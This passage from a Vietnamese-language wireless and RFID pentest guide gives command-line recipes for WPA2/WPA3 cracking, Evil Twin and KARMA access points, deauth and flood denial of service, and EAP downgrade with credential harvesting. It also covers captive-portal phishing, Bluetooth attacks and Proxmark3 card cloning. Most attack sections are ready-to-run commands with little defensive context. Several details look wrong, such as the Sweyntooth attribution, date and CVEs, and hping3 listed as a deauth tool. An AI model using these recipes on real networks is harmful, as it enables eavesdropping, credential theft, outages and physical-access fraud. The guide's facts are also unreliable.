# Cài đặt công cụ Dragonblood (của Mathy Vanhoef)
git clone https://github.com/vanhoefm/dragonblood
cd dragonblood

# Downgrade Attack
python3 dragonblood.py downgrade -i wlan0mon -b BSSID

# Timing Attack
python3 dragonblood.py timing -i wlan0mon -b BSSID

# Information Element Analysis
python3 dragonblood.py info -i wlan0mon -b BSSID
```

### 4.4. Hashcat WPA3 cracking

hashcat hỗ trợ WPA3 từ mode 22000 (giống WPA2):
```bash
# Bắt SAE handshake với hcxdumptool
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1

# Convert
hcxpcapngtool capture.pcapng -o hash.22000

# Crack
hashcat -m 22000 hash.22000 wordlist.txt
```

**Lưu ý:** WPA3-SAE không thể crack offline nếu không có handshake đầy đủ (password không bao giờ truyền qua không khí). Chỉ bắt được hash của kết nối đã hoàn thành.

## 5. Evil Twin Attack

### 5.1. Nguyên lý

Evil Twin là AP giả mạo có cùng SSID với AP thật. Khi client kết nối vào Evil Twin, attacker có thể:
- Capture handshake (để crack offline)
- Chặn traffic
- Tạo captive portal để phishing
- MITM (Man-in-the-Middle)

### 5.2. Công cụ Evil Twin

**Cách 1: airbase-ng (đơn giản)**
```bash
# Tạo monitor interface
airmon-ng start wlan0

# Tạo Evil Twin (không mã hóa)
airbase-ng -e "TargetSSID" -c 6 wlan0mon

# Evil Twin với WPA2
airbase-ng -e "TargetSSID" -c 6 -W 1 -Z 4 wlan0mon

# Kết hợp với DHCP + NAT
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
dnsmasq -C dnsmasq.conf
```

**Cách 2: hostapd-wpe (Enterprise)**
```bash
# Cấu hình hostapd-wpe
nano /etc/hostapd-wpe/hostapd-wpe.conf

# Nội dung cấu hình:
# interface=wlan0
# ssid=TargetSSID
# channel=6
# hw_mode=g
# wpa=3
# wpa_key_mgmt=WPA-EAP
# ieee8021x=1
# eap_server=1
# eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user

# Chạy
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

**Cách 3: EAPHammer (hiện đại)**
```bash
# Cài đặt
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
./kali-setup

# Evil Twin
./eaphammer --cert-wizard   # Tạo cert trước
./eaphammer -i wlan0 --clone-ssid TargetSSID -c 6 --creds
```

### 5.3. KARMA Attack

KARMA (Karma Attack Radio Machine Automaton) — tấn công dựa trên probe request:

- **Probe Request**: Client gửi SSID của mạng đã từng kết nối (preferred network list - PNL)
- **KARMA Attack**: AP giả trả lời MỌI probe request → client tự động kết nối
- **Hiệu quả nhất với**: Client lưu nhiều mạng, đặc biệt là mạng công cộng

```bash
# airbase-ng KARMA mode
airbase-ng -P -C 30 -e "FreeWiFi" wlan0mon

# mana toolkit (KARMA nâng cao)
git clone https://github.com/sensepost/mana
cd mana
./mana-start.sh

# Bettercap KARMA
sudo bettercap -eval "set wifi.ap.ssid MyFreeWiFi; wifi.ap"
```

## 6. KRACK Attack

### 6.1. Lý thuyết

KRACK (Key Reinstallation Attack) — phát hiện bởi Mathy Vanhoef năm 2017.

**Cơ chế:** Tấn công vào 4-way handshake của WPA2 bằng cách replay Message 3 của handshake.
- Khi client nhận Message 3 lần 2, nó "reinstall" key đã có
- Điều này đặt nonce và receive packet counter (replay counter) về 0
- Attacker có thể:
  - Replay old packets
  - Giải mã packet (nếu biết được key)
  - Giả mạo packet

### 6.2. Công cụ KRACK

```bash
# Công cụ KRACK (Mathy Vanhoef)
git clone https://github.com/vanhoefm/krackattacks
cd krackattacks

# Cài đặt
./install.sh

# Chạy test
python krack_test.py wlan0 --ap BSSID --client CLIENT_MAC
```

### 6.3. Các protocol bị ảnh hưởng

- WPA2-PSK: ✅
- WPA2-Enterprise: ✅
- WPA-TKIP: ✅ (có thể giải mã và inject)
- WPA2/FT/802.11r: ✅
- WPA3 (SAE): Chỉ ảnh hưởng nếu ở chế độ compatibility

### 6.4. Mitigation

- Patch OS (Microsoft, Apple, Google đã patch từ cuối 2017)
- 802.11w (Protected Management Frames) — giảm thiểu một phần
- WPA3 — không bị ảnh hưởng trực tiếp

## 7. Deauth Attack / Disassociation Attack

### 7.1. Nguyên lý

Management frames (deauth, disassoc) không được mã hóa trong WPA2. Attacker có thể giả mạo những frame này.

```
Attacker ---[Spofed Deauth from AP]---> Client
→ Client ngắt kết nối và tìm AP lại
```

### 7.2. Công cụ

```bash
# aireplay-ng deauth
aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon
# -0: deauth, 5: số lần, -a: AP MAC, -c: Client MAC

# Continuous deauth (chỉ định -0 0)
aireplay-ng -0 0 -a AP_MAC wlan0mon   # Deauth tất cả client

# MDK4 deauth (mạnh hơn, hỗ trợ SSID list)
mdk4 wlan0mon d -a AP_MAC
mdk4 wlan0mon d -a AP_MAC -c CLIENT_MAC

# Deauth bằng hping3 (layer 3 - ít phổ biến)
hping3 -1 -c 1000 --spoof AP_IP CLIENT_IP

# Bettercap
sudo bettercap -eval "set arp.spoof.targets CLIENT_IP; arp.spoof on"
```

### 7.3. Ứng dụng của deauth

1. **Bắt handshake**: Deauth → client reconnect → bắt 4-way handshake
2. **DoS local network**: Deauth tất cả client để ngắt mạng
3. **KARMA/Evil Twin trigger**: Deauth → client tìm AP → kết nối vào Evil Twin
4. **PMKID capture trigger**: Một số AP gửi PMKID sau deauth

### 7.4. Chống deauth (802.11w)

- **802.11w (Protected Management Frames - PMF)**: Mã hóa management frames
- WPA3 bắt buộc PMF
- WPA2 có thể bật PMF (optional)
- Khi PMF active, deauth/assoc frames được mã hóa → không thể spoof

## 8. Beacon Flood, Probe Response Flood, Auth Flood

### 8.1. Beacon Flood

Gửi hàng loạt beacon frame với SSID ngẫu nhiên:

```bash
# MDK4 beacon flood
mdk4 wlan0mon b -n "FakeNet" -a 00:11:22:33:44:55
mdk4 wlan0mon b -c 6 -n "FakeNet"   # Kênh cụ thể

# Từ file SSID list
echo "FreeWiFi
CoffeeShop
Airport
Target" > ssids.txt
mdk4 wlan0mon b ssids.txt
```

**Mục đích:**
- Gây nhiễu (client thấy hàng trăm AP, confusion)
- DoS client (client crash khi xử lý quá nhiều beacon)
- Bypass MAC filter (tạo AP với BSSID giống mạng thật)

### 8.2. Probe Response Flood

Gửi probe response cho mọi probe request:

```bash
mdk4 wlan0mon p -t BSSID -c 6
```

**Mục đích:**
- Làm crash một số client
- Waste AP resources
- Kết hợp với KARMA attack

### 8.3. Authentication Flood

Gửi auth frame liên tục đến AP:

```bash
mdk4 wlan0mon a -i BSSID
```

**Mục đích:**
- DoS AP — làm AP quá tải, crash, hoặc reset
- Thử nghiệm AP's resilience
- Một số AP cũ không xử lý được auth flood → crash

## 9. MAC Filter Bypass

### 9.1. Nguyên lý

MAC filter dùng whitelist (chỉ cho phép MAC đã đăng ký) hoặc blacklist. Bypass bằng cách:

1. **Monitor mode capture → đọc MAC của client đã kết nối**
2. **Change MAC của attacker interface thành MAC đó**
3. **Kết nối với MAC đã được phép**

### 9.2. Công cụ

```bash
# Xem client đã kết nối
airodump-ng --bssid AP_MAC wlan0mon

# Disconnect client thật (optional)
aireplay-ng -0 1 -a AP_MAC -c CLIENT_MAC wlan0mon

# Change MAC của interface
ifconfig wlan0 down
macchanger -m CLIENT_MAC wlan0
ifconfig wlan0 up

# Hoặc dùng airmon-ng
airmon-ng stop wlan0mon
macchanger -r wlan0   # Random MAC
airmon-ng start wlan0

# Kết nối với MAC mới
iwconfig wlan0 essid "TargetSSID"
```

### 9.3. Wireless client isolation bypass

Một số AP có "client isolation" (ngăn client kết nối với nhau):
- Dùng ARP spoofing ở layer 2 (nếu attacker có thể kết nối AP)
- Dùng Proxy ARP
- Tấn công AP → tắt client isolation

## 10. Hidden SSID Discovery

### 10.1. Nguyên lý

AP ẩn SSID (trong beacon, SSID = null hoặc padded). Nhưng SSID được gửi trong:
- Probe Response (khi client gửi directed probe)
- Association Request (khi client kết nối)
- Beacon của một số AP (dù ẩn, SSID vẫn xuất hiện dưới dạng string)

### 10.2. Cách phát hiện

```bash
# Phương pháp 1: Chờ client kết nối → SSID xuất hiện
airodump-ng --bssid AP_MAC wlan0mon

# Phương pháp 2: Deauth → client reconnect → capture Probe Request/Association Request
aireplay-ng -0 2 -a AP_MAC wlan0mon

# Phương pháp 3: Brute force SSID (nếu SSID ngắn)
mdk4 wlan0mon h -i AP_MAC -t 6   # Brute force từ dict
mdk4 wlan0mon h -i AP_MAC -t 6 -f ssid_dict.txt

# Phương pháp 4: Dùng Kismet passive discovery
# Kismet tự động phát hiện hidden SSID qua probe response và association
```

---

# D. WIRELESS ENTERPRISE ATTACKS

## 1. Tổng quan về WPA2-Enterprise

### 1.1. Kiến trúc 802.1X

WPA2-Enterprise sử dụng 802.1X authentication framework:

```
STA (Client) <---> AP (Authenticator) <---> RADIUS Server (Authentication Server)
```

**Giao thức EAP (Extensible Authentication Protocol):**
- EAP được chạy trên EAPoL (EAP over LAN) giữa STA và AP
- AP đóng gói EAP trong RADIUS và gửi đến RADIUS server
- RADIUS server xác thực và gửi MSK (Master Session Key) về AP

**Các bước:**
1. STA gửi EAPoL-Start
2. AP gửi EAP-Request/Identity
3. STA gửi EAP-Response/Identity (chứa username)
4. AP bắt đầu EAP method (EAP-TLS, PEAP, EAP-TTLS...)
5. Xác thực hoàn tất → AP nhận MSK từ RADIUS
6. 4-way handshake giữa STA và AP

### 1.2. Các EAP methods phổ biến

| Method | Xác thực | Mã hóa | Độ an toàn |
|--------|---------|--------|-----------|
| **EAP-TLS** | Certificate mutual | TLS tunnel | Rất an toàn |
| **PEAP (EAP-MSCHAPv2)** | Server cert + MSCHAPv2 | TLS tunnel + MSCHAPv2 | Trung bình |
| **EAP-TTLS** | Server cert + PAP/CHAP/MSCHAP | TLS tunnel | Trung bình |
| **EAP-FAST** | PAC (Protected Access Credential) | TLS tunnel | Trung bình |
| **LEAP** | MSCHAPv1 (không tunnel) | Không | Rất yếu |
| **EAP-MD5** | Password MD5 | Không | Yếu |

## 2. EAP Relay Attacks

### 2.1. Nguyên lý

EAP relay attack dùng một thiết bị rogue AP để "relay" EAP messages giữa client thật và AP thật:

```
Client --->[Evil Twin]---[Relay Channel]---[Real AP]---[RADIUS Server]
```

Mục đích: Client tưởng đang kết nối với Evil Twin, nhưng thực ra Evil Twin chỉ là cầu nối đến AP thật → attacker có thể capture credential.

### 2.2. Công cụ

```bash
# EAPHammer (đã nói ở phần Evil Twin)
./eaphammer -i wlan0 --clone-ssid TargetEnterprise -c 6 --creds --auth WPA-EAP

# hostapd-wpe (creds capture)
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials lưu ở:
# /usr/share/hostapd-wpe/captured-creds/*
```

## 3. EAPHammer — Enterprise Attack Framework

### 3.1. Cài đặt

```bash
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
./kali-setup
```

### 3.2. Các chế độ tấn công

```bash
# 1. Credential harvesting (chụp thông tin đăng nhập)
./eaphammer -i wlan0 --auth wpa-eap --essid "CorpWiFi" --creds

# 2. EAP downgrade (giảm cấp EAP method)
./eaphammer -i wlan0 --auth wpa-eap --essid "CorpWiFi" --creds --negotiate weakest

# 3. Evil Twin với certificate tự động
./eaphammer -i wlan0 --auth wpa-eap --essid "CorpWiFi" --creds --cert-wizard

# 4. Known Beacons (KARMA + Enterprise)
./eaphammer -i wlan0 --known-beacons --creds

# 5. PMKID capture
./eaphammer -i wlan0 --pmkid-broadcast
```

### 3.3. EAP Downgrade Attack

Đây là tính năng quan trọng nhất của EAPHammer:
- Client cấu hình PEAP (tương đối an toàn)
- Evil Twin quảng bá chỉ hỗ trợ LEAP hoặc EAP-MD5
- Client tự động downgrade xuống EAP yếu hơn
- Credential bị capture ở dạng clear text (EAP-MD5) hoặc dễ crack (LEAP)

**Các EAP method từ yếu đến mạnh:**
1. LEAP (yếu nhất — crackable offline)
2. EAP-MD5 (yếu — không mutual auth)
3. EAP-GTC (gửi password clear text)
4. PEAP-MSCHAPv2 (trung bình)
5. EAP-TTLS-PAP (trung bình)
6. EAP-TLS (mạnh nhất)

## 4. Hostile Portal Attacks

### 4.1. Captive Portal + Credential Harvesting

Evil Twin với captive portal yêu cầu đăng nhập → thu thập credential:

```bash
# Dùng airbase-ng + dnsmasq + nginx
# 1. Tạo Evil Twin
airbase-ng -e "Free Airport WiFi" -c 1 wlan0mon

# 2. Cấu hình DHCP/DNS
# /etc/dnsmasq.conf:
# interface=at0
# dhcp-range=10.0.0.10,10.0.0.100,12h
# dhcp-option=3,10.0.0.1
# dhcp-option=6,10.0.0.1
# address=/#/10.0.0.1

# 3. Tạo captive portal trang web giả
# /var/www/html/index.html — form login giả (Facebook, Google, etc.)

# 4. Công cụ có sẵn: Fluxion, WiFiPhisher
```

### 4.2. WiFiPhisher

```bash
git clone https://github.com/wifiphisher/wifiphisher
cd wifiphisher
python3 wifiphisher.py -i wlan0

# Menu chọn: evil twin, captive portal template, credential harvesting
```

### 4.3. Fluxion

```bash
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
./fluxion.sh

# GUI: chọn target, deauth, evil twin, captive portal, capture handshake
```

## 5. FreeRADIUS Abuse

### 5.1. RADIUS Shared Secret Attack

Nếu biết được RADIUS shared secret (default credential):
- Decrypt RADIUS traffic
- Giả mạo Access-Accept
- Tạo rogue AP kết nối được với RADIUS

**Brute force RADIUS secret:**
```bash
# Từ packet capture
radcrack capture.pcap -w wordlist.txt

# Online brute force
radlogin -t PAP COVES_IP -w wordlist.txt
```

### 5.2. RADIUS Dictionary Attack

Với PEAP và các EAP tunnel methods, RADIUS server thường dùng inner method (MSCHAPv2). Có thể tấn công:

```bash
# asleap — crack LEAP và PEAP challenge
asleap -r capture.pcap -w wordlist.txt
asleap -C CHALLENGE -R RESPONSE -W /usr/share/wordlists/rockyou.txt

# eapmd5crackpy — crack EAP-MD5
eapmd5crack-py -r capture.pcap -w wordlist.txt
```

## 6. PEAP, EAP-MSCHAPv2, EAP-TLS, EAP-TTLS

### 6.1. PEAP (Protected EAP) Attack

PEAP tạo TLS tunnel trước, sau đó gửi credential trong tunnel:

```bash
# Capture PEAP handshake
airodump-ng -c 6 --bssid AP_MAC -w peap_capture wlan0mon

# Giải mã PEAP (nếu có private key của server cert)
# Cần server certificate private key
```

**Tấn công PEAP:**
1. Evil Twin with PEAP → capture MSCHAPv2 hash
2. Tấn công MSCHAPv2 hash offline
3. Downgrade PEAP xuống EAP-GTC để capture password clear text

### 6.2. MSCHAPv2 Cracking

MSCHAPv2 hash có thể crack offline:
```bash
# Công cụ: asleap
asleap -C CHALLENGE -R RESPONSE -W wordlist.txt

# Hashcat mode 5500 (MSCHAPv2)
hashcat -m 5500 hash.txt wordlist.txt
```

**Lưu ý:** MSCHAPv2 hash là NetNTLMv1 hash — có thể dùng để pass-the-hash hoặc relay đến SMB.

### 6.3. EAP-TLS Attack

EAP-TLS dùng client certificate — rất khó tấn công nếu certificate được quản lý đúng:
- **Giả mạo client certificate**: Nếu client không verify server certificate
- **Theft của client certificate**: Extract từ device
- **Downgrade**: Không thể, EAP-TLS yêu cầu mutual authentication

### 6.4. EAP-TTLS Attack

Tương tự PEAP nhưng linh hoạt hơn (hỗ trợ PAP, CHAP, MSCHAP, MSCHAPv2 làm inner method):
- **Tấn công**: Dùng Evil Twin với EAP-TTLS, capture inner method
- **Nếu inner là PAP**: Password clear text
- **Nếu inner là MSCHAPv2**: Hash có thể crack

## 7. 802.1X Bypass

### 7.1. MAC Authentication Bypass (MAB)

Nhiều enterprise network dùng MAB làm fallback:
- Nếu device không hỗ trợ 802.1X → AP cho phép dựa trên MAC address
- **Bypass**: Spoof MAC của device được phép

```bash
# Tìm MAC được MAB
airodump-ng -c 6 --bssid AP_MAC wlan0mon
# Thấy client kết nối mà không cần EAP → MAB enabled

# Spoof MAC
ifconfig wlan0 down
macchanger -m CLIENT_MAC wlan0
ifconfig wlan0 up
```

### 7.2. 802.1X Supplicant Attack

Một số supplicant (client) có lỗ hổng:
- Không verify server certificate → dễ bị Evil Twin
- Gửi credential trước khi verify server → credential leak
- Accept self-signed certificate → attacker có thể MITM

---

# E. BLUETOOTH ATTACKS

## 1. Classic Bluetooth (BR/EDR)

### 1.1. Kiến trúc Bluetooth Classic

- **Frequency**: 2.4 GHz ISM band (2400-2483.5 MHz)
- **Modulation**: GFSK, π/4-DQPSK, 8DPSK
- **Channels**: 79 channels (1 MHz spacing), hop rate 1600 hops/sec
- **Piconet**: 1 master + 7 active slaves
- **Range**: Class 1 (100m), Class 2 (10m), Class 3 (1m)
- **Power**: Class 1 = 100 mW (20 dBm), Class 2 = 2.5 mW (4 dBm), Class 3 = 1 mW (0 dBm)

### 1.2. Giao thức và Services

- **L2CAP**: Logical Link Control and Adaptation Protocol — multiplexing, segmentation
- **RFCOMM**: Serial port emulation (RS-232)
- **SDP**: Service Discovery Protocol
- **HSP/HFP**: Headset/Hands-Free Profile
- **A2DP**: Advanced Audio Distribution Profile
- **AVRCP**: Audio/Video Remote Control Profile
- **PAN**: Personal Area Networking Profile
- **HID**: Human Interface Device Profile
- **SPP**: Serial Port Profile
- **OBEX**: Object Exchange (vCard, vCal, files)

### 1.3. Security Modes

- **Mode 1**: No security (discoverable, connectable)
- **Mode 2**: Service-level security (L2CAP)
- **Mode 3**: Link-level security (authentication + encryption)
- **Mode 4**: Secure Simple Pairing (SSP)

### 1.4. Các attack trên Classic Bluetooth

**BlueBorne (2017):**
- 8 lỗ hổng trong stack Bluetooth Android, iOS, Windows, Linux
- Cho phép RCE (Remote Code Execution) không cần pairing
- Lây lan như worm (airborne)
- CVE-2017-0781, CVE-2017-0782, CVE-2017-8628...

**BlueSmack (DoS):**
- Gửi L2CAP ping lớn → DoS device
- Dùng `l2ping -s 10000 BT_ADDR`

**BlueSnarf (Data theft):**
- Kết nối đến OBEX Push profile không cần auth
- Đánh cắp danh bạ, tin nhắn, file
- Công cụ: `obexftp`, `bluesnarfer`

**BlueBug (Command execution):**
- Khai thác lỗ hổng AT command trên RFCOMM
- Gửi AT commands đến headset, car kit → điều khiển từ xa
- Có thể gửi SMS, đọc tin nhắn, gọi điện

**Car Whisperer:**
- Tấn công vào Bluetooth car kit
- Gửi audio vào speaker của xe
- Inject audio hoặc nghe lén microphone

### 1.5. Công cụ

```bash
# BlueZ tools
hciconfig     # Configure Bluetooth device
hcitool scan  # Discover devices
hcitool name  # Get device name
hcitool info  # Get device info
hcitool cc    # Create connection
hcitool dc    # Disconnect
hcitool auth  # Authenticate
hcitool enc   # Enable encryption
hcitool key   # Display stored keys
hcitool lq    # Link quality
hcitool rssi  # RSSI

# l2ping (ping Bluetooth device)
l2ping BT_ADDR -s 10000    # BlueSmack attack

# sdptool (service discovery)
sdptool browse BT_ADDR     # Browse all services

# rfcomm (serial port)
rfcomm connect 0 BT_ADDR 1  # Connect to channel 1

# obexftp (object push)
obexftp -b BT_ADDR -p file.txt  # Push file

# blueranger (estimate distance)
blueranger -r BT_ADDR

# btscanner (GUI)
btscanner
```

## 2. Bluetooth Low Energy (BLE)

### 2.1. Kiến trúc BLE

- **Frequency**: 2.4 GHz ISM band (2402-2480 MHz)
- **Channels**: 40 channels (2 MHz spacing)
  - 3 advertising channels (37, 38, 39)  
  - 37 data channels
- **Modulation**: GFSK
- **Range**: Up to 100m (BLE 5.0)
- **Data rate**: 1 Mbps (BLE 4.x), 2 Mbps (BLE 5.0)
- **Topology**: Piconet, broadcast, mesh (BLE 5.0)

**BLE Architecture:**
- **Controller**: Physical layer, Link Layer
- **Host**: L2CAP, Attribute Protocol (ATT), Generic Attribute Profile (GATT), Security Manager (SM), Generic Access Profile (GAP)
- **Application**: GATT profiles/services

### 2.2. GAP (Generic Access Profile)

- **Broadcaster**: Chỉ phát advertising
- **Observer**: Chỉ scan
- **Peripheral**: Advertising + connectable (slave)
- **Central**: Scan + initiate connection (master)

### 2.3. GATT (Generic Attribute Profile)

GATT defines:
- **Services**: Collections of characteristics
- **Characteristics**: Data values với properties (read, write, notify, indicate)
- **Descriptors**: Metadata về characteristics

```
Ví dụ cấu trúc GATT:
└── Heart Rate Service (UUID: 0x180D)
    ├── Heart Rate Measurement (UUID: 0x2A37)
    │   ├── Properties: Notify
    │   └── Value: [Flags, HR Value]
    └── Body Sensor Location (UUID: 0x2A38)
        ├── Properties: Read
        └── Value: [0=Other, 1=Chest, 2=Wrist...]
```

### 2.4. BLE Security

- **LE Legacy Pairing** (v4.0, v4.1)
  - Just Works: No MITM protection
  - Passkey Entry: 6-digit PIN
  - Out of Band (OOB): NFC, etc.
  
- **LE Secure Connections** (v4.2+)
  - ECDH key exchange (P-256)
  - Numeric Comparison: 6-digit confirmation
  - Chống MITM tốt hơn

- **LTK (Long Term Key)** — lưu sau pairing, dùng để mã hóa connection
- **STK (Short Term Key)** — dùng trong Legacy Pairing
- **CSRK (Connection Signature Resolving Key)** — sign data
- **IRK (Identity Resolving Key)** — resolve random addresses

### 2.5. BLE Attack Tools

```bash
# BlueZ BLE tools
bluetoothctl
# > scan on
# > devices
# > connect XX:XX:XX:XX:XX:XX
# > services
# > gatt.list-attributes

# gatttool (GATT interaction)
gatttool -b XX:XX:XX:XX:XX:XX -t random -I
# > connect
# > primary
# > characteristics
# > read-handle 0x0020
# > char-write-req 0x0025 01

# Bettercap BLE
sudo bettercap -eval "ble.recon on"
sudo bettercap -eval "ble.show"

# BTLE Juice (Bluetooth sniffing)
btlejack -f -s -d /dev/ttyACM0

# GATTacker (BLE MITM)
git clone https://github.com/gattacker/gattacker
cd gattacker
node ble-sniff.js

# nRF Connect (mobile app)
# Console BLE tool: https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp
```

### 2.6. BLE Attacks

**Sweyntooth (2023 - Mathy Vanhoef + Lior Neumann):**
- 11 lỗ hổng trong BLE stack phổ biến (Cypress, TI, NXP, Dialog, Telink...)
- DoS, crash, deadlock của BLE device
- Bypass authentication
- CVE-2023-28795, CVE-2023-27559...

**BLUFFS (2023 - Daniele Antonioli):**
- Tấn công vào Session Key derivation trong Bluetooth Classic và BLE
- Làm yếu key → brute force
- CVE-2023-24023
- Ảnh hưởng Bluetooth v4.2 đến v5.4

**BLE Advertisement Hijacking:**
- Spoof BLE advertisement → thay thế device thật
- Dùng BLE MITM → intercept và modify GATT data

**BLE Connection Hijacking:**
- Nếu biết LTK (từ cracking hoặc extract) → có thể decrypt và impersonate device

**GATT Service Spoofing:**
- Tạo BLE peripheral giả với cùng service UUID → client kết nối nhầm

### 2.7. BLE Cracking

```bash
# Capture BLE pairing
btlejack -f -s -d /dev/ttyACM0

# Cracking TK (Temporary Key) từ pairing
# Dùng crackle (công cụ chuyên cho BLE cracking)
crackle -i capture.pcap -l 123456  # Nếu biết Passkey

# Phân tích BLE traffic
tshark -r capture.pcap -Y "btble"
```

## 3. BLE Mobile Interaction Attacks

### 3.1. Beacon Spoofing

- **iBeacon (Apple)**: UUID, Major, Minor
- **Eddystone (Google)**: UID, URL, TLM
- **AltBeacon**: Open source alternative

Tấn công:
- Spoof beacon để trigger actions trên mobile app
- Fake proximity (giả mạo khoảng cách)
- Phishing qua beacon URL (Eddystone-URL)

```bash
# Dùng Raspberry Pi làm BLE beacon
sudo hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 1A 1A FF 4C 00 02 15 UUID MAJOR MINOR RSSI 00

# Python script
python3 -c "
import sys
import struct
import bluetooth.ble as ble

# iBeacon advertisement data
uuid = 'YOUR_UUID'
major = 1
minor = 1
tx_power = -59
adv_data = bytearray()
adv_data.append(0x02)  # Flags length
adv_data.append(0x01)  # Flags type
adv_data.append(0x1a)  # Flags value
adv_data.append(0x1a)  # Manufacturer data length
adv_data.append(0xff)  # Manufacturer data type
adv_data.append(0x4c)  # Apple company ID
adv_data.append(0x00)
adv_data.append(0x02)  # iBeacon type
adv_data.append(0x15)  # Data length
# ... UUID, Major, Minor, RSSI
"
```

### 3.2. BLE Mobile MITM

Dùng PC với BLE USB dongle làm MITM:
- GATTacker (Node.js based)
- BTLEJuice (Python)
- InternalBlue (Qualcomm BLE debugging)

---

# F. RFID/NFC ATTACKS

## 1. Tổng quan về RFID và NFC

### 1.1. Tần số và chuẩn

| Loại | Tần số | Range | Tốc độ | Ứng dụng |
|------|--------|-------|--------|----------|
| **LF (Low Frequency)** | 125-134 kHz | <10 cm | Slow | Access control, animal ID |
| **HF (High Frequency)** | 13.56 MHz | <1 m | Medium | NFC, payment, transit |
| **UHF (Ultra High)** | 860-960 MHz | >10 m | Fast | Logistics, inventory |
| **SHF (Microwave)** | 2.45-5.8 GHz | >10 m | Very fast | Toll collection |

### 1.2. NFC Types

- **Type A (ISO 14443A)**: NXP (Mifare, NTAG), Sony, Infineon
  - Communication: Miller coding, ask modulation
  - Anti-collision: Bit-oriented (UID cascade level)
  
- **Type B (ISO 14443B)**: STMicroelectronics, Motorola
  - Communication: NRZ coding, BPSK modulation
  - Anti-collision: Slot-oriented

- **Type F (ISO 18092 / FeliCa)**: Sony (used in Japan, Hong Kong transit)
  - Communication: Manchester coding, ASK modulation
  - Speed: 212 kbps hoặc 424 kbps

- **ISO 15693**: Vicinity cards (longer range, ~1m)
  - Used for: library books, asset tracking

## 2. Mifare Classic

### 2.1. Kiến trúc

Mifare Classic 1K:
- 16 sectors × 4 blocks = 64 blocks
- Mỗi block: 16 bytes
- Sector 0 chứa UID (4 bytes) + manufacturer data
- Mỗi sector có 2 key: Key A và Key B (6 bytes each)
- Access conditions xác định quyền (read, write, increment, decrement)

### 2.2. Crypto-1

Mifare Classic dùng thuật toán Crypto-1:
- Stream cipher (dạng keystream)
- 48-bit LFSR (Linear Feedback Shift Register)
- Nonce 32-bit + UID 32-bit + keystream

**Vấn đề bảo mật:**
- Thuật toán bí mật (security by obscurity) — bị reverse engineer năm 2008
- Nonce quá ngắn (32-bit)
- Nested authentication attack: từ 1 key biết trước → tìm key khác
- Card chỉ hỗ trợ xác thực, không mã hóa dữ liệu

### 2.3. Cracking Crypto-1

**mfoc (Mifare Classic Offline Crack):**
```bash
# Tấn công nonce vào từng sector
mfoc -O dump.mfd -P KNOWN_KEY

# Recover toàn bộ keys (nested attack)
mfoc -O dump.mfd
```

**mfcuk (Mifare Classic Universal Toolkit):**
```bash
# Brute force key (one sector at a time)
mfcuk -r 0 -k FFFFFFFFFFFF -s 0 -t 1 -T 1 -o key.txt
```

**Hardnested Attack:**
- Phát hiện bởi Carlo Meijer và Roel Verdult (2013)
- Dùng FPGA/GPU để accelerate Dark Side attack
- Giảm thời gian từ vài phút xuống vài giây

```bash
# Công cụ: Hardnested (trong proxmark3)
# Trên Proxmark3:
hf mf hardnested 0 A FFFFFFFFFFFF
```

### 2.4. Thẻ tương đương

- **Mifare Classic 1K/4K**: Phổ biến nhất
- **Mifare Plus**: Cải thiện (AES-128), nhưng có thể downgrade
- **Mifare DESFire**: AES-128 (chưa crack được)
- **Mifare Ultralight**: Không mã hóa, đọc được dễ dàng
- **NTAG21x**: NFC Type 2, không bảo mật

## 3. EM410x

### 3.1. Giới thiệu

EM410x là chip RFID LF (125 kHz) phổ biến nhất trong access control:
- **EM4100**: 40-bit ID (10 hex digits)
- **EM4102**: EM4100 + programmable
- **EM4200**: EM4100 compatible + password protection
- **EM4305**: EM4100 compatible + read/write

**Format:**
- 1 start bit (1111111111 — 10 bits)
- 40 data bits (5 × 8 bits, mỗi byte có 1 parity bit)
- Column parity bits
- Stop bit (0)

### 3.2. Cloning

```bash
# Trên Proxmark3:
# Bước 1: Đọc thẻ
lf search

# Bước 2: Mô phỏng thẻ
lf em 410x sim ID

# Bước 3: Ghi vào thẻ T5577 (thẻ trắng)
lf em 410x write ID

# Ví dụ cụ thể:
lf search                    # Tìm thẻ LF
lf em 410x read              # Đọc ID
lf em 410x sim 0E00123456    # Giả lập thẻ
lf em 410x write 0E00123456  # Ghi vào thẻ trắng
```

## 4. RFID Cloning, Sniffing, Relay Attack

### 4.1. Cloning (Sao chép thẻ)

**Phương pháp:**
1. **Dùng Proxmark3 + thẻ trắng (T5577, Magic Mifare)**
   ```bash
   # LF cloning
   lf search
   lf em 410x read
   lf em 410x write ID
   
   # HF cloning
   hf mf dump  # Dump nếu biết key
   hf mf restore  # Ghi vào thẻ mới
   ```

2. **Dùng ChameleonMini** (thẻ lập trình)
   - Upload dumped card configuration qua USB
   - Chameleon có thể giả lập 8 thẻ khác nhau

3. **Dùng Flipper Zero**
   - Read NFC/RFID
   - Save
   - Emulate hoặc write

### 4.2. Sniffing (Nghe lén giao tiếp)

```bash
# Proxmark3 HF sniffing
hf sniff  # Sniff RFID reader ↔ card communication

# Proxmark3 LF sniffing
lf sniff

# Phân tích giao thức
trace list  # Xem các command/response đã sniff
```

### 4.3. Relay Attack (Tấn công chuyển tiếp)

Relay attack kéo dài khoảng cách giữa thẻ và reader:
```
Reader <---> Attacker Device A <---> [Internet] <---> Attacker Device B <---> Card
```

**Công cụ:**
- **Proxmark3 làm reader relay**
- **Two ChameleonMini**: một ở reader, một ở card
- **NFCProxy**: Android-based relay

## 5. Proxmark3 RDV4

### 5.1. Giới thiệu

Proxmark3 RDV4 là công cụ mạnh nhất cho RFID/NFC pentest:
- FPGA-based SDR cho 125 kHz-13.56 MHz
- Built-in antenna + external antenna port
- Bluetooth module (optional)
- SD card slot (firmware update, storage)
- Buttons + OLED display (standalone mode)

### 5.2. Các lệnh quan trọng

```bash
# Tổng quan cứng
hw version
hw status
hw tune        # Tune antenna

# LF commands
lf search      # Tìm thẻ LF gần đó
lf config      # Cấu hình LF
